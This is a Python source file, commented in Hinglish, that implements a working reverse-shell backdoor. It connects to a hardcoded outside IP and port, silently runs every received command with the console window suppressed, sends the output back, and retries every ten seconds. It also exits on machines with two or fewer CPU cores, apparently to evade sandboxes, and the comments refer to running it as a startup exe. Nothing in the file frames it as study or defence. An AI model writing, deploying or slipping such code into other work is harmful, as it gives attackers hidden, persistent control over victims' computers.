import os
import socket
import subprocess
import time

# Agar CPU cores 2 se kam hain toh band ho jaye
if os.cpu_count() <= 2:
    quit()

HOST = '193.161.193.99'
PORT = 49213

# Windows me background me command run karne ke liye ye flag zaroori hai
# Agar ye nahi lagayenge toh startup me exe hang ho jayega
CREATE_NO_WINDOW = 0x08000000

# Outer Loop: Listener aane tak wait karega aur bar bar try karega
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connection try karo
        s.connect((HOST, PORT))
        s.send(str.encode("[*] Connection Established!"))
        
        # Inner Loop: Jab tak listener band na ho ya 'quit' na de
        while True:
            try:
                s.send(str.encode(os.getcwd() + "> "))
                data = s.recv(1024).decode("UTF-8")
                
                # Agar listener ne connection tod diya
                if not data:
                    break
                    
                data = data.strip('\n')
                if data == "quit": 
                    break
                    
                if data[:2] == "cd":
                    try:
                        os.chdir(data[3:])
                    except:
                        pass # Agar galat directory ho toh error na bheje, bas wahi rahe
                        
                if len(data) > 0:
                    # creationflags=CREATE_NO_WINDOW isse koi bhi command silent mode me run hogi
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=CREATE_NO_WINDOW) 
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    s.send(str.encode("\n" + output_str))
            except Exception as e:
                # Agar commands chalte waqt error aaye (jaise listener band ho jaye)
                break
                
    except Exception as e:
        # Agar connection fail ho (Listener band hai) toh 10 second ruko aur dobara try karo
        pass
        
    finally:
        try:
            s.close()
        except:
            pass
            
    # Listener aane tak 10 second ka gap rakho (CPU ko overload na karne ke liye)
    time.sleep(10)